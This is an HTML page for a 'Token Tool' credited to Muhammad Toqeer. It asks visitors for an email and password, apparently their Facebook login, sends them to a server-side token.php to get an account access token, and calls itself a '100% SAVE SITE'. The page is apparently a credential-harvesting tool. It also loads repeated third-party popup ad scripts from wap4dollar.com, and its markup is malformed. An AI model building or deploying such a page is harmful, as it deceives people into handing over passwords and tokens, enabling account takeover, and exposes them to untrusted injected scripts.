<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=67medkyx3n"></script>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Token-Tool By Muhammad Toqeer</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="toqeer.css">
  <script src="ali.css"></script>
  <script src="gull.js"></script>
  <div class="panel-heading"></div>
<body>
 <div id="content">
<br><br>
<center>
<div class="Habibur Mohammad">
<a href="https://Facebook.com/100002383109158" alt="Habibur Mohammad" target="_blank">
<img
src="https://graph.facebook.com/100002383109158/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="200" height="200"></a>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=67medkyx3n"></script>
</head>

<body>
 
<div class="container">
  <h2>Token Tool By Muhammad Toqeer</h2> <font color="red">
  <div class="panel-group">
<div class="panel panel-primary">
      <div class="panel-heading">100% SAVE SITE NO SPAM</div> <font color="yellow">
      <div class="panel-body">      
<div class="form-group">
  <label for="usr">ENTER THE EMAIL :</label>
  <input type="text" class="form-control" id="tk"> <font color="yellow">
</div>
<div class="form-group">
  <label for="pwd">ENTER THE PASSWORD:</label> 
  <input type="text" class="form-control" id="mk"> <font color="yellow">
</div>
<button4 type="button button4" class="btn btn-danger" onclick="Puaru_Active()" >GET TOKEN </button4> <font color="red">
<p>
<li id="trave" class="list-group-item"><img src="a.jpg"> </li></p>

 <font color="yellow"> Script By :-  <a href="https://www.facebook.com/100002383109158" target="blank"><font color="red">Muhammad Toqeer<br>



</div>
    </div>
</div>

<script>
function Puaru_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "token.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>

</body>
</html>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=67medkyx3n"></script>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=67medkyx3n"></script>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=67medkyx3n"></script>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=67medkyx3n"></script>